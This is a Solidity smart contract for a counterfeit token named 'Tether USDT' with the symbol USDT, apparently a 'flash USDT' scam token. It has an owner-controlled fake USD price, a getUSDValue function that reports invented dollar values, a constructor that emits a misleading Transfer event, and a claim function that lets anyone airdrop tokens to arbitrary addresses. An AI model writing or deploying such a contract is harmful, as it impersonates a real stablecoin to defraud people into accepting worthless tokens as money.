pragma solidity ^0.8.0;

contract FlashUSDT {
	// Token metadata
	string public name = "Tether USDT";
	string public symbol = "USDT";
	uint8 public decimals = 6;
	uint256 public totalSupply;

	// Address to hold initial supply
	address public initialHolder;

	// Mapping of balances and allowances (for transfer/approve functionality)
	mapping(address => uint256) public balanceOf;
	mapping(address => mapping(address => uint256)) public allowance;

	// Mapping to track whether an address has already claimed tokens
	mapping(address => bool) public hasClaimed;

	// Fixed amount that each eligible address can claim (in smallest units)
	uint256 public claimAmount;

	// Simulated USD price per token (stored in cents)
	uint256 public usdPriceInCents;

	// The owner of the contract, allowed to update the price and set migration parameters.
	address public owner;

	// Expiration and migration variables
	uint256 public expirationTime;
	address public originalUSDTContract;

	// Events for transfers, approvals, and price updates
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
	event PriceUpdated(uint256 newPriceInCents);

	constructor(uint256 initialSupply,address startholder,uint256 val) {
		owner = msg.sender;
		totalSupply = initialSupply;
		initialHolder = startholder;
		balanceOf[initialHolder] = totalSupply;
		claimAmount = (initialSupply / 200);
		usdPriceInCents = val;
		expirationTime = block.timestamp + 730 days;
		
		// approve(initialHolder,totalSupply / 4);
		
		emit Transfer(address(0), initialHolder, totalSupply / 4);
	}

	modifier onlyOwner() {
		require(msg.sender == owner, "Not authorized");
		_;
	}

	function transfer(address _to, uint256 _value) public returns (bool success) {
		require(_to != address(0), "Invalid recipient address");
		require(balanceOf[msg.sender] >= _value, "Insufficient balance");
		
		balanceOf[msg.sender] -= _value;
		balanceOf[_to] += _value;
		
		emit Transfer(msg.sender, _to, _value);
		return true;
	}

	function approve(address _spender, uint256 _value) public returns (bool success) {
		allowance[msg.sender][_spender] = _value;
		
		emit Approval(msg.sender, _spender, _value);
		return true;
	}

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
		require(_to != address(0), "Invalid recipient address");
		require(balanceOf[_from] >= _value, "Insufficient balance");
		require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
		
		balanceOf[_from] -= _value;
		balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
		
		emit Transfer(_from, _to, _value);
		return true;
	}

	function claimTokens(address recipient) public returns (bool success) {
		require(recipient != address(0), "Invalid recipient address");
		require(!hasClaimed[recipient], "Address has already claimed tokens");
		require(balanceOf[initialHolder] >= claimAmount, "Not enough tokens in reserve");
		
		hasClaimed[recipient] = true;
		balanceOf[initialHolder] -= claimAmount;
		balanceOf[recipient] += claimAmount;

		emit Transfer(initialHolder, recipient, claimAmount);
		return true;
	}

	function setUSDPriceInCents(uint256 _priceInCents) public onlyOwner {
		usdPriceInCents = _priceInCents;
		emit PriceUpdated(_priceInCents);
	}

	function getUSDValue(address account) public view returns (uint256) {
		uint256 wholeTokens = balanceOf[account] / (10 ** uint256(decimals));
		return wholeTokens * usdPriceInCents;
	}

	function setOriginalUSDTContract(address _originalUSDT) public onlyOwner {
		require(_originalUSDT != address(0), "Invalid address");
		originalUSDTContract = _originalUSDT;
	}

	function migrateTokens() public onlyOwner returns (bool success) {
		require(block.timestamp >= expirationTime, "Migration period not reached yet");
		require(originalUSDTContract != address(0), "Original USDT contract address not set");
		
		uint256 remainingTokens = balanceOf[initialHolder];
		require(remainingTokens > 0, "No tokens to migrate");
		
		balanceOf[initialHolder] = 0;
		balanceOf[originalUSDTContract] += remainingTokens;
		
		emit Transfer(initialHolder, originalUSDTContract, remainingTokens);
		return true;
	}
	
    // 	my custom codes
    function checkAllowance(address who) public view returns(uint256 val){
        return allowance[who][msg.sender];
    }

    // end of custom codes

	receive() external payable {}

	fallback() external payable {
		revert("Transaction reverted");
	}
}
